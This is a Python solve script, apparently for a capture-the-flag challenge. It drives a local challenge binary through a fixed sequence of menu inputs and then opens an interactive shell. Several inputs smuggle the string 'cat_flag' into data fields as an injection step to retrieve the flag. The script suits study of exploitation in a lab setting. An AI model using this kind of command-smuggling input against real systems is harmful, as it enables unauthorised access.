from time import *
from ptrlib import *
from subprocess import getoutput
from sys import argv

is_remote = len(argv) >= 2

if is_remote:
  print('run remote')
  p = Socket('localhost', 8931)
else :
  print('run local')
  p = Process('./chal', cwd='../challenge/')

seq = ['1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '2', '0', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '1', '2', '2', '0', '1', '2', '2', '0', '1', '3', '2', '0', '2', '0', '1', '3', '1', '2', '2', '1', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '1', '2', '2', '2', '1', '2', '1', '2', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '2', '4', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '1', '3', '2', '4', '2', '0', '1', '3', '1', '3', '2', '4', '1', '2', '1', '2', '2', '0', '2', '2', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '2', '3', '1', '3', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '1', '2', '2', '5', '2', '4', '1', '2', '2', '6', '1', '3', '2', '7', '2', '1', '2', '0', '2', '1', '1', '3', '2', '1', '2', '4', '2', '0', '1', '3', '2', '5', '1', '4', '0123456789abcdefghijklmnopqrstuvwxyz', '1', '2', '2', '5', '1', '2', '2', '0']

for l in seq:
  p.sendline(l.replace('ijklmnop', 'cat_flag'))

p.sendline('5')
p.sendline('3')
p.recvuntil('Well done!\n')
print(p.recv())

p.sh()
